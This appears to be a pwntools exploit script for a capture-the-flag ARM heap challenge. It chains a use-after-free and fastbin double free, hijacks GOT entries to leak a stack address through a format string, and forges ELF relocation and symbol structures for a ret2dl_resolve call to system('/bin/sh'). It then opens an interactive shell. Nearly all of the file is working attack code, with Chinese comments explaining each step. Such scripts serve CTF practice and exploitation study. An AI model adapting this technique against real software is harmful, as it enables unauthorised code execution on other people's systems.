# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")
e = ELF("./pwn")
rlibc = ''
ip = ''
port = ''
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.debug()


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        # p = process(["qemu-arm", "-g", "1111", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
        p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

def add(size, c):
    sla("choice:", '1')
    sla(":", str(size))
    sea(":", c)
    #sleep(0.5)
    
def delete(idx):
    sla("choice:", '2')
    sla(":", str(idx))
    #sleep(0.5)

def show(idx):
    sla("choice:", '3')
    sla("Index :", str(idx))

def edit(idx,c):
    sla("choice:", '5')
    sla(":", str(idx))
    sea(":", c)
    #sleep(0.5)

note_list = 0x21088
Sym_offset = 0x10eb
name_offset = 0x10d88
fake_got = 0x2961c
gadget = 0x10b20

fake_ELF32_Rel = ""
fake_ELF32_Rel += p32(e.got['free'])
fake_ELF32_Rel += p32((Sym_offset << 8) ^ 0x16)

fake_ELF32_Sym = ""
fake_ELF32_Sym += p32(name_offset)
fake_ELF32_Sym += p32(0) * 2
fake_ELF32_Sym += p32(0x12)

run(1)
sea(":", "Mask".ljust(0x1c, '\x00') + p32(0x31))
add(0x28, '0')
add(0x28, '1')
add(0x28, '2')
add(0x28, '3')
add(0x28, '4')
add(0x28, '5')
add(0x28, '6')
add(0x28, '%10$p;/bin/sh')
delete(2)
delete(3)
delete(2)
add(0x28, p32(0x21078 + 8))
add(0x28, '5')
add(0x28, p32(0x21078 + 8))
add(0x28, p32(note_list) + p32(e.got['puts']))
# UAF + Fastbin Attack 控制notelist
edit(1, p32(0x010524))
show(7)
stack = int(rn(10), 16) - 0x20
# 修改puts@got为printf@plt实现格式化字符串漏洞利用泄漏栈地址
edit(0, p32(e.got['free']) + p32(stack + 0x24) + p32(stack + 0x24 + 0x20) + p32(note_list + 0x10))
edit(3, p32(note_list + 0x2c) + p32(note_list + 0x3c) + p32(0x21004))
show(6)
link_map = un32(rn(4))
edit(3, p32(note_list + 0x2c) + p32(note_list + 0x3c) + p32(link_map + 0xe4))
edit(6, p32(0))
# 读取link_map地址，并修改[ink_map + 0xe4] = 0
edit(4, fake_ELF32_Rel + 'system'.ljust(0x8, '\x00'))
edit(5, fake_ELF32_Sym)
# 栈上布置fake_ELF32_Rel与fake_ELF32_Sym
edit(0, p32(gadget))
edit(1, p32(gadget) + p32(0x666) * 3)
edit(2, p32(fake_got) + p32(0x10a65) + p32(0x10510))
delete(7)
# 修改栈上数据实现ret to dl_resolve
shell()
# Get Shell
